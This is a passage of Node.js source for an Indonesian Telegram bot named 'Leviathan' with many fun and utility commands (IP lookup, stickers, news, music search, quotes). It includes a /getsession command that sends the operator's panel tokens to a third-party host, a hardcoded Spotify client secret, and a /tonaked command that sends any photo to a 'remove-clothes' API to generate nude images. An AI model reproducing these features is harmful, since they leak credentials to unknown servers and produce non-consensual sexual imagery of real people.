    const teks = `
🌍 *IP FOUND!*

• *IP:* ${data.query}
• *Country:* ${data.country}
• *City:* ${data.city}
• *ISP:* ${data.isp}

📍 [Lihat di Maps](https://www.google.com/maps?q=${data.lat},${data.lon})
    `;
    await bot.sendMessage(chatId, teks, { parse_mode: "Markdown" });
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "❌ Error: " + err.message);
  }
});

bot.onText(/^\/getsession$/, async (msg) => {
  const chatId = msg.chat.id;

  try {
    await bot.sendMessage(chatId, "⏳ Mengambil session...");

    const { data } = await axios.get("https://joocode.zone.id/api/getsession", {
      params: {
        domain: config.DOMAIN,
        plta: config.PLTA_TOKEN,
        pltc: config.PLTC_TOKEN,
      },
    });

    const tmpPath = path.join(process.cwd(), "Session.json");
    fs.writeFileSync(tmpPath, JSON.stringify(data, null, 2), "utf-8");

    await bot.sendDocument(chatId, tmpPath, {
      caption: "📦 Session file requested",
    });

    fs.unlinkSync(tmpPath); // hapus file setelah dikirim

  } catch (err) {
    console.error("GetSession Error:", err.message);
    bot.sendMessage(chatId, `❌ Gagal mengambil session.\n${err.message}`);
  }
});

bot.onText(/^\/bratvid(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = (match[1] || "").trim();

  if (!text) {
    return bot.sendMessage(chatId, "⚠️ Contoh:\n/bratvid woi kontol");
  }

  bot.sendMessage(chatId, "🎬 Lagi bikin sticker videonya bre...");

  try {
    const res = await fetch(`https://api.zenzxz.my.id/maker/bratvid?text=${encodeURIComponent(text)}`);
    if (!res.ok) throw new Error(`HTTP error ${res.status}`);

    const buffer = Buffer.from(await res.arrayBuffer()); // ✅ FIX disini

    const tmpFile = path.join(__dirname, `bratvid_${Date.now()}.webm`);
    fs.writeFileSync(tmpFile, buffer);

    await bot.sendSticker(chatId, tmpFile);

    fs.unlinkSync(tmpFile);
  } catch (e) {
    console.error(e);
    bot.sendMessage(chatId, "❌ Gagal generate sticker video.");
  }
});

bot.onText(/^\/qc(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = (match[1] || "").trim();

  try {
    // Cek kalau user nge-reply pesan orang
    let target = msg.from;
    let messageText = text;

    if (msg.reply_to_message) {
      target = msg.reply_to_message.from;
      messageText = msg.reply_to_message.text;
    }

    if (!messageText) {
      return bot.sendMessage(
        chatId,
        "⚠️ Contoh:\n- /qc Halo dunia\n- Balas teks orang → /qc"
      );
    }

    // warna random
    const warna = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"];
    const reswarna = warna[Math.floor(Math.random() * warna.length)];

    // Ambil foto profil target
    let ppuser = "https://files.catbox.moe/gqs7oz.jpg"; // default fallback

    try {
      const photos = await bot.getUserProfilePhotos(target.id);
      if (photos.total_count > 0) {
        const fileId = photos.photos[0][0].file_id;
        const fileLink = await bot.getFileLink(fileId);
        ppuser = fileLink;
      }
    } catch {}

    // body API
    const obj = {
      type: "quote",
      format: "png",
      backgroundColor: reswarna,
      width: 512,
      height: 768,
      scale: 2,
      messages: [
        {
          entities: [],
          avatar: true,
          from: {
            id: 1,
            name: target.first_name || "Unknown",
            photo: { url: ppuser },
          },
          text: messageText,
          replyMessage: {},
        },
      ],
    };

    // Request API
    const json = await axios.post("https://bot.lyo.su/quote/generate", obj, {
      headers: { "Content-Type": "application/json" },
    });

    const buffer = Buffer.from(json.data.result.image, "base64");

    // kirim sticker
    await bot.sendSticker(chatId, buffer);

  } catch (err) {
    console.error("QC Error:", err.message);
    bot.sendMessage(chatId, `❌ Error: ${err.message}`);
  }
});

bot.onText(/^\/gpt(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = (match[1] || "").trim();

  if (!query) {
    return bot.sendMessage(
      chatId,
      "⚠️ Contoh:\n/gpt apa itu gravitasi?"
    );
  }

  // pesan loading
  await bot.sendMessage(chatId, "⏳ Tunggu sebentar, lagi mikir...");

  try {
    const { data } = await axios.get("https://www.abella.icu/gpt-3.5", {
      params: { q: query },
      timeout: 30000,
    });

    const answer = data?.data?.answer;

    if (answer) {
      return bot.sendMessage(
        chatId,
        "```\n" + answer + "\n```",
        { parse_mode: "Markdown" }
      );
    } else {
      return bot.sendMessage(chatId, "⚠️ Tidak ada respons valid dari AI.");
    }

  } catch (err) {
    console.error("GPT Error:", err);
    bot.sendMessage(chatId, `❌ Error: ${err.message}`);
  }
});

bot.onText(/^\/ocr$/, async (msg) => {
  const chatId = msg.chat.id;

  // Pastikan user reply gambar
  if (!msg.reply_to_message || !msg.reply_to_message.photo) {
    return bot.sendMessage(chatId, "📸 *Balas gambar* yang mau di OCR, bre.", { parse_mode: "Markdown" });
  }

  // Ambil photo resolusi tertinggi
  const photo = msg.reply_to_message.photo.slice(-1)[0];
  const fileId = photo.file_id;

  await bot.sendMessage(chatId, "⏳ Sedang memproses OCR mu bre...");

  try {
    // Ambil URL gambar dari Telegram (ini WAJIB, karena Telegram tidak langsung kasih URL foto)
    const fileLink = await bot.getFileLink(fileId);

    // OCR API Tetap → Tidak diganti
    const { data } = await axios.get(
      `https://api.deline.my.id/tools/ocr?url=${encodeURIComponent(fileLink)}`
    );

    if (!data?.status) throw new Error(data?.error || "API return false");

    // Adaptasi struktur output OCR
    const raw = data?.Text ?? data?.text ?? data?.extractedText ?? "";
    const text = String(raw).replace(/\\n/g, "\n").trim();

    bot.sendMessage(chatId, text || "📭 Ga ada teks nya bre.");

  } catch (e) {
    bot.sendMessage(chatId, `⚠️ Error bre:\n${e.message}`);
  }
});

bot.onText(/\/fixcode/, async (msg) => {
  const chatId = msg.chat.id;
  const replyMsg = msg.reply_to_message;

  try {
    // Cek apakah user reply ke file .js
    if (!replyMsg || !replyMsg.document) {
      return bot.sendMessage(chatId, "📂 Kirim file .js dan *reply* dengan perintah /fixcode", {
        parse_mode: "Markdown",
      });
    }

    const file = replyMsg.document;
    if (!file.file_name.endsWith(".js")) {
      return bot.sendMessage(chatId, "⚠️ File harus berformat .js bre!");
    }

    // Ambil file link
    const fileLink = await bot.getFileLink(file.file_id);
    await bot.sendMessage(chatId, "🤖 Lagi memperbaiki kodenya bre... tunggu bentar!");

    // Download isi file
    const response = await axios.get(fileLink, { responseType: "arraybuffer" });
    const fileContent = Buffer.from(response.data).toString("utf-8");

    // Kirim ke API NekoLabs
    const { data } = await axios.get("https://api.nekolabs.web.id/ai/gpt/4.1", {
      params: {
        text: fileContent,
        systemPrompt: `Kamu adalah seorang programmer ahli JavaScript dan Node.js.
Tugasmu adalah memperbaiki kode yang diberikan agar bisa dijalankan tanpa error, 
namun jangan mengubah struktur, logika, urutan, atau gaya penulisan aslinya.

Fokus pada:
- Menyelesaikan error sintaks (kurung, kurawal, tanda kutip, koma, dll)
- Menjaga fungsi dan struktur kode tetap sama seperti input
- Jangan menghapus komentar, console.log, atau variabel apapun
- Jika ada blok terbuka (seperti if, else, try, atau fungsi), tutup dengan benar
- Jangan ubah nama fungsi, variabel, atau struktur perintah
- Jangan tambahkan penjelasan apapun di luar kode
- Jangan tambahkan markdown javascript Karena file sudah berbentuk file .js
- Hasil akhir harus langsung berupa kode yang siap dijalankan
`,
        sessionId: "neko"
      },
      timeout: 60000,
    });

    if (!data.success || !data.result) {
      return bot.sendMessage(chatId, "❌ Gagal memperbaiki kode, coba ulang bre.");
    }

    const fixedCode = data.result;
    const outputPath = `./fixed_${file.file_name}`;
    fs.writeFileSync(outputPath, fixedCode);

    await bot.sendDocument(chatId, outputPath, {}, {
      filename: `fixed_${file.file_name}`,
      contentType: "text/javascript",
    });
  } catch (err) {
    console.error("FixCode Error:", err);
    bot.sendMessage(chatId, "⚠️ Terjadi kesalahan waktu memperbaiki kode bre.");
  }
});

const MAINT_FILE = './#Leviathan ♰/maintenance.json';

// helper: buat file kalau belum ada
function ensureMaintenanceFile() {
  if (!fs.existsSync('./#Leviathan ♰')) fs.mkdirSync('./#Leviathan ♰', { recursive: true });
  if (!fs.existsSync(MAINT_FILE)) {
    fs.writeFileSync(MAINT_FILE, JSON.stringify({ enabled: false }, null, 2));
  }
}
ensureMaintenanceFile();

// baca status maintenance (synchronous sederhana)
function readMaintenance() {
  try {
    const raw = fs.readFileSync(MAINT_FILE, 'utf8');
    const data = JSON.parse(raw);
    return Boolean(data.enabled);
  } catch (e) {
    console.error("Gagal membaca maintenance file:", e.message);
    return false;
  }
}

// set maintenance dan simpan
function setMaintenance(status) {
  try {
    fs.writeFileSync(MAINT_FILE, JSON.stringify({ enabled: Boolean(status) }, null, 2));
    return true;
  } catch (e) {
    console.error("Gagal menulis maintenance file:", e.message);
    return false;
  }
}

// helper publik
function isMaintenance() {
  return readMaintenance();
}

// watch file agar runtime ikut update bila file diubah manual
try {
  fs.watch(MAINT_FILE, (ev) => {
    if (ev === 'change') {
      console.log("[MAINT] maintenance.json berubah. Status sekarang:", isMaintenance());
    }
  });
} catch (e) {
  // ignore watch errors
}

// Telegram command: setmaintenance on|off
bot.onText(/^\/setmaintenance\s+(on|off)$/i, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const mode = match[1].toLowerCase();

  // only owner or admin
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, `❌ Akses ditolak. Hanya Owner/Admin yang dapat melakukan ini.`);
  }

  const status = mode === 'on';
  const ok = setMaintenance(status);
  if (!ok) {
    return bot.sendMessage(chatId, `❌ Gagal mengubah status maintenance. Periksa log server.`);
  }

  const msgText = status ? `✅ Mode maintenance di AKTIFKAN. Hanya Owner/Admin yang dapat menjalankan perintah sensitif.` :
                          `✅ Mode maintenance di NON-AKTIFKAN. Bot beroperasi normal.`;

  bot.sendMessage(chatId, msgText);
});

// Telegram command: /maintenance -> cek status
bot.onText(/^\/maintenancestatus$/i, (msg) => {
  const chatId = msg.chat.id;
  const status = isMaintenance();
  const text = status ? "🔴 BOT SEDANG MAINTENANCE (ON)" : "🟢 BOT AKTIF (OFF)";
  bot.sendMessage(chatId, text);
});
// ---------- END: Maintenance Feature ---------- //

bot.onText(/\/play (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const sender = msg.from.username || msg.from.first_name;
  const query = match[1];

  try {
    await bot.sendMessage(chatId, "⏳ Lagi nyari lagu di Spotify, tunggu bentar bre...");

    const api = `https://api.nekolabs.my.id/downloader/spotify/play/v1?q=${encodeURIComponent(query)}`;
    const { data } = await axios.get(api);

    if (!data.success || !data.result) {
      return bot.sendMessage(chatId, "❌ Gagal ambil data lagu dari Spotify!");
    }

    const { metadata, downloadUrl } = data.result;
    const { title, artist, cover, duration } = metadata;

    const caption = `
<blockquote>🎵 ${title || "Unknown"}</blockquote>
<blockquote>👤 ${artist || "Unknown"}</blockquote>
<blockquote>🕒 Durasi: ${duration || "-"}</blockquote>
`;

    await bot.sendPhoto(chatId, cover, {
      caption,
      parse_mode: "HTML",
    });

    await bot.sendAudio(chatId, downloadUrl, {
      title: title || "Unknown Title",
      performer: artist || "Unknown Artist",
    });
  } catch (err) {
    console.error("Play Error:", err);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat memutar lagu bre.");
  }
});


const SPOTIFY_CLIENT_ID = "e791953ecb0540d898a5d2513c9a0dd2";
const SPOTIFY_CLIENT_SECRET = "23e971c5b0ba4298985e8b00ce71d238";

// Fungsi ambil token Spotify
async function getSpotifyToken() {
  const res = await fetch("https://accounts.spotify.com/api/token", {
    method: "POST",
    headers: {
      "Authorization":
        "Basic " +
        Buffer.from(`${SPOTIFY_CLIENT_ID}:${SPOTIFY_CLIENT_SECRET}`).toString("base64"),
      "Content-Type": "application/x-www-form-urlencoded",
    },
    body: "grant_type=client_credentials",
  });
  const data = await res.json();
  return data.access_token;
}

// Fungsi cari lagu di Spotify
async function searchSpotify(query) {
  const token = await getSpotifyToken();
  const res = await fetch(
    `https://api.spotify.com/v1/search?q=${encodeURIComponent(query)}&type=track&limit=1`,
    { headers: { Authorization: `Bearer ${token}` } }
  );
  const data = await res.json();
  if (data.tracks?.items?.length === 0) return null;
  return data.tracks.items[0];
}

// Command /song
bot.onText(/^\/song(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = match[1]?.trim();

  if (!query) {
    return bot.sendMessage(
      chatId,
      "🎵 Gunakan format:\n`/song [judul lagu]`\nContoh: `/song shape of you`",
      { parse_mode: "Markdown" }
    );
  }

  await bot.sendMessage(chatId, `🔍 Mencari *${query}* di Spotify...`, {
    parse_mode: "Markdown",
  });

  try {
    const song = await searchSpotify(query);
    if (!song) {
      return bot.sendMessage(chatId, "❌ Lagu tidak ditemukan di Spotify.");
    }

    const title = song.name;
    const artist = song.artists.map(a => a.name).join(", ");
    const album = song.album.name;
    const url = song.external_urls.spotify;
    const cover = song.album.images[0]?.url;

    const keyboard = {
      reply_markup: {
        inline_keyboard: [
          [{ text: "🎧 Dengar di Spotify", url: url }]
        ]
      }
    };

    await bot.sendPhoto(chatId, cover, {
      caption: `🎵 *${title}*\n👤 ${artist}\n💽 Album: ${album}`,
      parse_mode: "Markdown",
      ...keyboard
    });
  } catch (err) {
    console.error("Error /song:", err);
    bot.sendMessage(chatId, "⚠️ Terjadi kesalahan saat mencari lagu.");
  }
});

bot.onText(/^\/shortlink(?: (.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const url = match[1];

  if (!url) {
    return bot.sendMessage(
      chatId,
      "🔗 Kirim link yang ingin dipendekkan!\n\nContoh:\n`/shortlink https://example.com/artikel/panjang/banget`",
      { parse_mode: "Markdown" }
    );
  }

  try {
    // Gunakan TinyURL API (tidak butuh API key)
    const res = await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(url)}`);
    const shortUrl = await res.text();

    if (!shortUrl || !shortUrl.startsWith("http")) {
      throw new Error("Gagal memendekkan link");
    }

    await bot.sendMessage(
      chatId,
      `✅ *Link berhasil dipendekkan!*\n\n🔹 Asli: ${url}\n🔹 Pendek: ${shortUrl}`,
      { parse_mode: "Markdown" }
    );
  } catch (err) {
    console.error("❌ Error shortlink:", err);
    bot.sendMessage(chatId, "⚠️ Gagal memendekkan link. Coba lagi nanti.");
  }
});

bot.onText(/^\/negarainfo(?: (.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const negara = match[1]?.trim();

  if (!negara) {
    return bot.sendMessage(chatId, "🌍 Ketik nama negara!\nContoh: `/negarainfo jepang`", { parse_mode: "Markdown" });
  }

  try {
    const res = await fetch(`https://restcountries.com/v3.1/name/${encodeURIComponent(negara)}?fullText=false`);
    const data = await res.json();

    if (!Array.isArray(data) || !data.length) {
      return bot.sendMessage(chatId, "⚠️ Negara tidak ditemukan. Coba ketik nama lain.");
    }

    const n = data[0];
    const name = n.translations?.id?.common || n.name.common;
    const capital = n.capital ? n.capital[0] : "Tidak ada data";
    const region = n.region || "Tidak ada data";
    const subregion = n.subregion || "-";
    const population = n.population?.toLocaleString("id-ID") || "-";
    const currency = n.currencies ? Object.values(n.currencies)[0].name : "-";
    const symbol = n.currencies ? Object.values(n.currencies)[0].symbol : "";
    const flag = n.flag || "🏳️";

    const info = `
${flag} *${name}*

🏙️ Ibukota: ${capital}
🌍 Wilayah: ${region} (${subregion})
👨‍👩‍👧‍👦 Populasi: ${population}
💰 Mata uang: ${currency} ${symbol}
📍 Kode negara: ${n.cca2 || "-"}
`;

    bot.sendMessage(chatId, info, { parse_mode: "Markdown" });
  } catch (err) {
    console.error("❌ Error negara info:", err);
    bot.sendMessage(chatId, "⚠️ Gagal mengambil data negara. Coba lagi nanti.");
  }
});

bot.onText(/^\/beritaindo$/, async (msg) => {
  const chatId = msg.chat.id;
  await bot.sendMessage(chatId, "📰 Sedang mengambil berita terbaru Indonesia...");

  try {
    // RSS Google News Indonesia
    const url = "https://news.google.com/rss?hl=id&gl=ID&ceid=ID:id";
    const res = await fetch(url);
    const xml = await res.text();

    // Ambil judul dan link berita (pakai regex biar ringan)
    const titles = [...xml.matchAll(/<title>(?:<!\[CDATA\[)?(.*?)(?:\]\]>)?<\/title>/g)].map((m) => m[1]);
    const links = [...xml.matchAll(/<link>(.*?)<\/link>/g)].map((m) => m[1]);

    // Lewati item pertama (judul feed)
    const items = titles.slice(1, 6).map((t, i) => ({
      title: t,
      link: links[i + 1] || "",
    }));

    // Format teks berita
    const beritaText = items
      .map((item, i) => `${i + 1}. [${item.title}](${item.link})`)
      .join("\n\n");

    await bot.sendMessage(
      chatId,
      `🇮🇩 *Berita Indonesia Terbaru*\n\n${beritaText}\n\nSumber: ©Leviathan`,
      { parse_mode: "Markdown", disable_web_page_preview: true }
    );
  } catch (error) {
    console.error("❌ Error beritaindo:", error);
    bot.sendMessage(chatId, "⚠️ Gagal mengambil berita. Coba lagi nanti.");
  }
});

bot.onText(/^\/logo (.+)$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];

  try {
    // Gunakan layanan FlamingText (gratis, no API key)
    const logoUrl = `https://flamingtext.com/net-fu/proxy_form.cgi?imageoutput=true&script=neon-logo&text=${encodeURIComponent(text)}`;

    await bot.sendMessage(chatId, `🖋️ Logo kamu siap!\nTeks: *${text}*`, { parse_mode: "Markdown" });
    await bot.sendPhoto(chatId, logoUrl, { caption: "✨ Logo by FlamingText" });
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "⚠️ Terjadi kesalahan saat membuat logo. Coba lagi nanti.");
  }
});

bot.onText(/^\/pantun(?:\s+(\w+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const kategori = (match[1] || "acak").toLowerCase();

  const pantun = {
    lucu: [
      "Pergi ke hutan mencari rusa,\nEh malah ketemu si panda.\nLihat kamu senyum manja,\nBikin hati jadi gembira 😆",
      "Pagi-pagi makan soto,\nSambil nonton film kartun.\nLihat muka kamu begitu,\nAuto hilang semua beban 😄",
      "Burung pipit terbang ke awan,\nTurun lagi ke pinggir taman.\nLihat kamu ketawa lebay-an,\nTapi lucunya kebangetan! 😂"
    ],
    cinta: [
      "Pergi ke pasar membeli bunga,\nBunga mawar warna merah.\nCinta ini untukmu saja,\nSelamanya takkan berubah ❤️",
      "Mentari pagi bersinar indah,\nBurung berkicau sambut dunia.\nCintaku ini sungguh berserah,\nHanya padamu selamanya 💌",
      "Bintang di langit berkelip terang,\nAngin malam berbisik lembut.\nHatiku tenang terasa senang,\nSaat kau hadir beri hangat 💞"
    ],
    bijak: [
      "Padi menunduk tanda berisi,\nRumput liar tumbuh menjulang.\nOrang bijak rendah hati,\nWalau ilmu setinggi bintang 🌾",
      "Air jernih di dalam kendi,\nJatuh setetes ke atas batu.\nJangan sombong dalam diri,\nHidup tenang karena bersyukur selalu 🙏",
      "Ke pasar beli pepaya,\nDibelah dua buat sarapan.\nBijaklah dalam setiap kata,\nAgar hidup penuh kedamaian 🌿"
    ]
  };

  // Gabungkan semua kategori buat opsi "acak"
  const allPantun = [...pantun.lucu, ...pantun.cinta, ...pantun.bijak];

  // Pilih pantun sesuai kategori
  let daftar;
  if (pantun[kategori]) daftar = pantun[kategori];
  else daftar = allPantun;

  const randomPantun = daftar[Math.floor(Math.random() * daftar.length)];

  bot.sendMessage(
    chatId,
    `🎭 *Pantun ${kategori.charAt(0).toUpperCase() + kategori.slice(1)}:*\n\n${randomPantun}`,
    { parse_mode: "Markdown" }
  );
});

bot.onText(/^\/trending$/, async (msg) => {
  const chatId = msg.chat.id;
  await bot.sendMessage(chatId, "📊 Sedang mengambil topik trending di Indonesia...");

  try {
    // URL Google Trends RSS Indonesia
    const trendsUrl = "https://trends.google.com/trends/trendingsearches/daily/rss?geo=ID";
    const newsUrl = "https://news.google.com/rss?hl=id&gl=ID&ceid=ID:id"; // fallback

    // Ambil data dari Google Trends dulu
    const res = await fetch(trendsUrl);
    const xml = await res.text();

    // Regex ambil judul
    let titles = [...xml.matchAll(/<title>(?:<!\[CDATA\[)?(.*?)(?:\]\]>)?<\/title>/g)]
      .map(match => match[1])
      .slice(1, 10); // lewati judul pertama (feed title)

    // Jika tidak ada hasil, fallback ke Google News
    if (!titles.length) {
      console.log("⚠️ Google Trends kosong, fallback ke Google News...");
      const newsRes = await fetch(newsUrl);
      const newsXml = await newsRes.text();

      const newsMatches = [...newsXml.matchAll(/<title>(?:<!\[CDATA\[)?(.*?)(?:\]\]>)?<\/title>/g)];
      const linkMatches = [...newsXml.matchAll(/<link>(.*?)<\/link>/g)];

      // Gabungkan judul + link (lewati entry pertama = header feed)
      const items = newsMatches.slice(1, 11).map((m, i) => ({
        title: m[1],
        link: linkMatches[i + 1] ? linkMatches[i + 1][1] : "",
      }));

      if (items.length) {
        const list = items.map((x, i) => `${i + 1}. [${x.title}](${x.link})`).join("\n\n");
        return bot.sendMessage(
          chatId,
          `📰 *Berita Teratas Hari Ini (Fallback: Google News)*\n\n${list}\n\nSumber: ©Leviathan`,
          { parse_mode: "Markdown", disable_web_page_preview: true }
        );
      } else {
        return bot.sendMessage(chatId, "⚠️ Tidak ada data trending atau berita tersedia saat ini.");
      }
    }

    // Jika ada hasil dari Google Trends
    const list = titles.map((t, i) => `${i + 1}. ${t}`).join("\n");
    await bot.sendMessage(
      chatId,
      `📈 *Topik Trending Hari Ini (Google Trends Indonesia)*\n\n${list}\n\nSumber: ©Leviathan Trends`,
      { parse_mode: "Markdown" }
    );

  } catch (error) {
    console.error("❌ Error trending:", error);
    bot.sendMessage(chatId, "⚠️ Gagal mengambil data trending. Coba lagi nanti.");
  }
});

bot.onText(/^\/katahariini$/, (msg) => {
  const chatId = msg.chat.id;

  // Kumpulan kata bijak atau kata mutiara
  const kataBijak = [
    "🌻 Hidup bukan tentang menunggu badai reda, tapi belajar menari di tengah hujan.",
    "🌅 Jangan biarkan kemarin mengambil terlalu banyak dari hari ini.",
    "💡 Satu-satunya batasan dalam hidupmu adalah dirimu sendiri.",
    "🔥 Setiap langkah kecil membawa kamu lebih dekat ke impianmu.",
    "🌈 Jika kamu tidak bisa terbang, berlarilah. Jika tidak bisa berlari, berjalanlah. Tapi teruslah bergerak maju.",
    "🌙 Jangan bandingkan perjalananmu dengan orang lain. Fokus pada jalanmu sendiri.",
    "☀️ Setiap hari adalah kesempatan baru untuk menjadi lebih baik dari kemarin.",
    "🌸 Kegagalan bukan akhir, tapi bagian dari proses menuju sukses.",
    "💫 Lakukan yang terbaik hari ini, karena besok belum tentu datang.",
    "🦋 Jangan takut berubah, karena perubahan adalah tanda kamu bertumbuh."

  ];

  // Pilih acak satu kata bijak
  const randomKata = kataBijak[Math.floor(Math.random() * kataBijak.length)];

  // Kirim pesan
  bot.sendMessage(chatId, `📜 *Kata Hari Ini:*\n\n${randomKata}`, { parse_mode: "Markdown" });
});

bot.onText(/^\/motivasi$/, async (msg) => {
  const chatId = msg.chat.id;

  // Kumpulan kata motivasi
  const motivasi = [
    "🔥 Jangan pernah menyerah, karena hal besar butuh waktu.",
    "💪 Kesuksesan tidak datang dari apa yang kamu lakukan sesekali, tapi dari apa yang kamu lakukan setiap hari.",
    "🌟 Percayalah pada proses, bukan hanya hasil.",
    "🚀 Gagal itu biasa, yang penting kamu tidak berhenti mencoba.",
    "💡 Mimpi besar dimulai dari langkah kecil yang berani.",
    "🌈 Setiap hari adalah kesempatan baru untuk menjadi lebih baik.",
    "🦁 Jangan takut gagal — takutlah kalau kamu tidak mencoba.",
    "🌻 Fokuslah pada tujuanmu, bukan pada hambatan di sekitarmu.",
    "⚡ Orang sukses bukan yang tidak pernah gagal, tapi yang tidak pernah menyerah.",
    "🌤️ Kamu lebih kuat dari yang kamu kira. Terus melangkah!"

  ];

  // Pilih kata motivasi acak
  const randomMotivasi = motivasi[Math.floor(Math.random() * motivasi.length)];
  await bot.sendMessage(chatId, `✨ *Motivasi Hari Ini:*\n\n${randomMotivasi}`, {
    parse_mode: "Markdown",
  });
});

bot.onText(/^\/hariini$/, (msg) => {
  const chatId = msg.chat.id;

  // Ambil tanggal dan waktu saat ini (WIB)
  const now = new Date();
  const optionsTanggal = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };

  // Format ke bahasa Indonesia
  const tanggal = now.toLocaleDateString('id-ID', optionsTanggal);
  const waktu = now.toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit', second: '2-digit' });

  // Pesan balasan
  const pesan = `📅 *Info Hari Ini*\n\n🗓️ Tanggal: ${tanggal}\n⏰ Waktu: ${waktu} WIB\n\nSelamat menjalani hari dengan semangat! 💪`;
  bot.sendMessage(chatId, pesan, { parse_mode: 'Markdown' });
});

bot.onText(/^\/faktaunik$/, async (msg) => {
  const chatId = msg.chat.id;

  // Daftar fakta unik — bisa kamu tambah sesuka hati
  const fakta = [
    "💡 Lebah bisa mengenali wajah manusia!",
    "🌎 Gunung Everest tumbuh sekitar 4 milimeter setiap tahun.",
    "🐙 Gurita memiliki tiga jantung dan darah berwarna biru.",
    "🧊 Air panas bisa membeku lebih cepat daripada air dingin — disebut efek Mpemba.",
    "🚀 Jejak kaki di bulan akan bertahan jutaan tahun karena tidak ada angin.",
    "🐘 Gajah tidak bisa melompat, satu-satunya mamalia besar yang tidak bisa.",
    "🦋 Kupu-kupu mencicipi dengan kakinya!",
    "🔥 Matahari lebih putih daripada kuning jika dilihat dari luar atmosfer.",
    "🐧 Penguin jantan memberikan batu kepada betina sebagai tanda cinta.",
    "🌕 Di Venus, satu hari lebih panjang daripada satu tahunnya!"
  ];

  // Pilih fakta secara acak
  const randomFakta = fakta[Math.floor(Math.random() * fakta.length)];
    
  await bot.sendMessage(chatId, `🎲 *Fakta Unik Hari Ini:*\n\n${randomFakta}`, {
    parse_mode: "Markdown",
  });
});

bot.onText(/^\/dunia$/, async (msg) => {
  const chatId = msg.chat.id;
  await bot.sendMessage(chatId, "🌍 Sedang mengambil berita dunia...");

  try {
    const url = "https://feeds.bbci.co.uk/news/world/rss.xml";
    const res = await fetch(url);
    const xml = await res.text();
      
    // Ambil 5 judul dan link pertama pakai regex
    const items = [...xml.matchAll(/<item>.*?<title><!\[CDATA\[(.*?)\]\]><\/title>.*?<link>(.*?)<\/link>/gs)]
      .slice(0, 5)
      .map(m => `• [${m[1]}](${m[2]})`)
      .join("\n\n");
      
    if (!items) throw new Error("Data kosong");
      
    const message = `🌎 *Berita Dunia Terbaru*\n\n${items}\n\n📰 _Sumber: ©Leviathan News_`;
    await bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
  } catch (e) {
    console.error(e);
    await bot.sendMessage(chatId, "⚠️ Gagal mengambil berita dunia. Coba lagi nanti.");
  }
});

bot.onText(/\/gempa/, async (msg) => {
  const chatId = msg.chat.id;
  try {
    const res = await fetch("https://data.bmkg.go.id/DataMKG/TEWS/autogempa.json");
    const data = await res.json();
    const gempa = data.Infogempa.gempa;
    const info = `
📢 *Info Gempa Terbaru BMKG*
📅 Tanggal: ${gempa.Tanggal}
🕒 Waktu: ${gempa.Jam}
📍 Lokasi: ${gempa.Wilayah}
📊 Magnitudo: ${gempa.Magnitude}
📌 Kedalaman: ${gempa.Kedalaman}
🌊 Potensi: ${gempa.Potensi}
🧭 Koordinat: ${gempa.Coordinates}
🗺️ *Dirasakan:* ${gempa.Dirasakan || "-"}
Sumber: ©Leviathan
    `;
    bot.sendMessage(chatId, info, { parse_mode: "Markdown" });
  } catch (err) {
    bot.sendMessage(chatId, "⚠️ Gagal mengambil data gempa dari BMKG.");
  }
});

bot.onText(/^\/tonaked(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const args = msg.text.split(' ').slice(1).join(' ');
  let imageUrl = args || null;
  if (!imageUrl && msg.reply_to_message && msg.reply_to_message.photo) {
    const fileId = msg.reply_to_message.photo.pop().file_id;
    const fileLink = await bot.getFileLink(fileId);
    imageUrl = fileLink;
  }

  if (!imageUrl) {
    return bot.sendMessage(chatId, '🪧 ☇ Format: /tonaked (reply gambar)');
  }

  const statusMsg = await bot.sendMessage(chatId, '⏳ ☇ Memproses gambar...');
  try {
    const res = await fetch(`https://api.nekolabs.my.id/tools/convert/remove-clothes?imageUrl=${encodeURIComponent(imageUrl)}`);
    const data = await res.json();
    const hasil = data.result;

    if (!hasil) {
      return bot.editMessageText('❌ ☇ Gagal memproses gambar, pastikan URL atau foto valid', {
        chat_id: chatId,
        message_id: statusMsg.message_id
      });
    }

    await bot.deleteMessage(chatId, statusMsg.message_id);
    await bot.sendPhoto(chatId, hasil);

  } catch (e) {
    console.error(e);
    await bot.editMessageText('❌ ☇ Terjadi kesalahan saat memproses gambar', {
      chat_id: chatId,
      message_id: statusMsg.message_id
    });
  }
});

const started = Date.now();
bot.onText(/^\/uptime$/, (msg) => {
  const s = Math.floor((Date.now()-started)/1000);
  const h = Math.floor(s/3600), m = Math.floor((s%3600)/60);
  bot.sendMessage(msg.chat.id, `⏱ Bot aktif: ${h} jam ${m} menit`);
});

bot.onText(/^\/pair$/, async (msg) => {
  const members = await bot.getChatAdministrators(msg.chat.id);
  const names = members.map(m=>m.user.first_name);
  const a = names[Math.floor(Math.random()*names.length)];
  const b = names[Math.floor(Math.random()*names.length)];
  bot.sendMessage(msg.chat.id, `💞 Pasangan hari ini: ${a} ❤️ ${b}`);
});

let groupRules = {};
bot.onText(/^\/setrules (.+)/, (msg, match) => {
  groupRules[msg.chat.id] = match[1];
  bot.sendMessage(msg.chat.id, "✅ Aturan grup disimpan.");

});

bot.onText(/^\/rules$/, (msg) => {
  const rules = groupRules[msg.chat.id] || "Belum ada aturan.";
  bot.sendMessage(msg.chat.id, `📜 *Aturan Grup:*\n${rules}`, { parse_mode: "Markdown" });
});

bot.onText(/^\/tagadmin$/, async (msg) => {
  const members = await bot.getChatAdministrators(msg.chat.id);
  const names = members.slice(0,30).map(m => `@${m.user.username || m.user.first_name}`).join(" ");
